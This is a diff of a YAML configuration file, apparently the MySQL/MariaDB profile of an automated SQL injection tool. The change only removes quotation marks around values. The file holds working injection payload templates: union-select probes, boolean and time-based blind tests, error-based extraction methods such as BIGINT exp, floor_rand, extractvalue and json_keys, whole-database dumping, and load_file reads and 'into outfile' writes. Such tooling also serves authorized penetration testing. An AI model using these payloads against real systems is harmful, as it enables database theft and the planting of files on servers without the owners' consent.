@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
    concat(
@@ -103,9 +103,9 @@ resource:
               {limit}
           ) x
    fields: 
-    field: "trim(ifnull(`${FIELD}`, 0x00))"
+    field: trim(ifnull(`${FIELD}`, 0x00))
     concat: ",0x7f,"
-  limit: "limit ${LIMIT}, 65536"
+  limit: limit ${LIMIT}, 65536
   
  zipped: 
   database: |
@@ -148,9 +148,9 @@ resource:
           from `${DATABASE}`.`${TABLE}`
           {limit}
    fields: 
-    field: "trim(ifnull(`${FIELD}`, 0x00))"
+    field: trim(ifnull(`${FIELD}`, 0x00))
     concat: ",0x7f,"
-  limit: "limit ${LIMIT}, 1"
+  limit: limit ${LIMIT}, 1
   
  dios: 
   database: |
@@ -197,9 +197,9 @@ resource:
               from `${DATABASE}`.`${TABLE}`
           )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
    fields: 
-    field: "trim(ifnull(`${FIELD}`, 0x00))"
+    field: trim(ifnull(`${FIELD}`, 0x00))
     concat: ",0x7f,"
-  limit: "limit ${LIMIT}, 1"
+  limit: limit ${LIMIT}, 1
   
  file: 
   privilege: |
@@ -215,10 +215,10 @@ resource:
        )
        as char
    )
-  read: "cast(concat(load_file(0x${FILEPATH.HEX}), ${TRAIL_HEX}) as char)"
+  read: cast(concat(load_file(0x${FILEPATH.HEX}), ${TRAIL_HEX}) as char)
   create: 
-   content: "(select 0x${CONTENT.HEX})"
-   query: "into outfile \"${FILEPATH}\""
+   content: (select 0x${CONTENT.HEX})
+   query: into outfile "${FILEPATH}"
    
 strategy: 
  configuration: 
@@ -234,20 +234,20 @@ strategy:
                )
            )
    )
-  limit: "limit ${LIMIT}, 65536"
-  failsafe: "1337${INDICE}7330%2b1"
-  calibrator: "repeat(${CALIBRATOR_HEX}, 65536)"
+  limit: limit ${LIMIT}, 65536
+  failsafe: 1337${INDICE}7330%2b1
+  calibrator: repeat(${CALIBRATOR_HEX}, 65536)
   limitBoundary: 0
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
-    - "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near"
+    - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near
     - MySQL
-    - "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near"
+    - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near
     - MariaDB
     
  normal: 
-  indices: "union select ${INDICES}"
+  indices: union select ${INDICES}
   capacity: |
    (
        select concat(
@@ -256,25 +256,25 @@ strategy:
            ${CALIBRATOR}
        )
    )
-  orderBy: "order by 1337"
+  orderBy: order by 1337
   
  boolean: 
   test: 
    falses: 
-    - "true = false"
-    - "true %21= true"
-    - "false %21= false"
-    - "1 = 2"
-    - "1 %21= 1"
-    - "2 %21= 2"
+    - true = false
+    - true %21= true
+    - false %21= false
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
    trues: 
-    - "true = true"
-    - "false = false"
-    - "true %21= false"
-    - "1 = 1"
-    - "2 = 2"
-    - "1 %21= 2"
-   initialization: "0%2b1 = 1"
+    - true = true
+    - false = false
+    - true %21= false
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
    bit: |
     ascii(
         substring(
@@ -284,8 +284,8 @@ strategy:
         )
     ) 
     %26 ${BIT}
-   length: "char_length(${INJECTION}) > ${INDEX}"
-  blind: "and ${TEST}"
+   length: char_length(${INJECTION}) > ${INDEX}
+  blind: and ${TEST}
   time: |
    and if(
        ${TEST}, 
@@ -295,7 +295,7 @@ strategy:
    
  error: 
   method: 
-   - name: "BIGINT::exp"
+   - name: BIGINT::exp
      query: |
       and !(
           select * 
@@ -305,7 +305,7 @@ strategy:
       )-~0
      capacity: 64
      
-   - name: "BIGINT::exp in Order By"
+   - name: BIGINT::exp in Order By
      query: |
       1, (
           select 1 
@@ -320,7 +320,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "BIGINT::exp in Delete Update Insert"
+   - name: BIGINT::exp in Delete Update Insert
      query: |
       ' or (
           select !(
@@ -329,10 +329,10 @@ strategy:
                   ${WINDOW}
               ) x
           )-~0
-      ) or '"
+      ) or '
      capacity: 64
      
-   - name: "DOUBLE::exp"
+   - name: DOUBLE::exp
      query: |
       and 1 = exp(
           ~(
@@ -344,7 +344,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "DOUBLE::exp in Order By"
+   - name: DOUBLE::exp in Order By
      query: |
       1, (
           select exp(
@@ -358,7 +358,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "DOUBLE::exp in Delete Update Insert"
+   - name: DOUBLE::exp in Delete Update Insert
      query: |
       ' or (
           select exp(
@@ -372,7 +372,7 @@ strategy:
       ) or '
      capacity: 64
      
-   - name: "GROUPBY::floor_rand"
+   - name: GROUPBY::floor_rand
      query: |
       or exists(
           select
@@ -386,7 +386,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "GROUPBY::floor_rand in Order By"
+   - name: GROUPBY::floor_rand in Order By
      query: |
       1, (
           select 1 from (
@@ -402,7 +402,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "GROUPBY::floor_rand in Delete Insert Update"
+   - name: GROUPBY::floor_rand in Delete Insert Update
      query: |
       ' or (
           select 1 from (
@@ -418,7 +418,7 @@ strategy:
       ) or '
      capacity: 64
      
-   - name: "JSON::json_keys"
+   - name: JSON::json_keys
      query: |
       /* Require FALSE statement, then OR */
       and 1 = 0 or 1 = (
@@ -433,7 +433,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "JSON::json_keys in Order By"
+   - name: JSON::json_keys in Order By
      query: |
       /* Require FALSE statement, then OR */
       1, (
@@ -448,7 +448,7 @@ strategy:
       )
      capacity: 64
      
-   - name: "JSON::json_keys in Delete Insert Update"
+   - name: JSON::json_keys in Delete Insert Update
      query: |
       ' or (
           select JSON_KEYS (
@@ -462,7 +462,7 @@ strategy:
       ) or '
      capacity: 64
      
-   - name: "XML::extractvalue"
+   - name: XML::extractvalue
      query: |
       and 1 = extractvalue(
           0x0a, 
@@ -473,7 +473,7 @@ strategy:
       )
      capacity: 99
      
-   - name: "XML::extractvalue in Order By"
+   - name: XML::extractvalue in Order By
      query: |
       1, (
           select 1 from (
@@ -488,7 +488,7 @@ strategy:
       )
      capacity: 99
      
-   - name: "XML::extractvalue in Delete Insert Update"
+   - name: XML::extractvalue in Delete Insert Update
      query: |
       ' or (
           select 1 from (
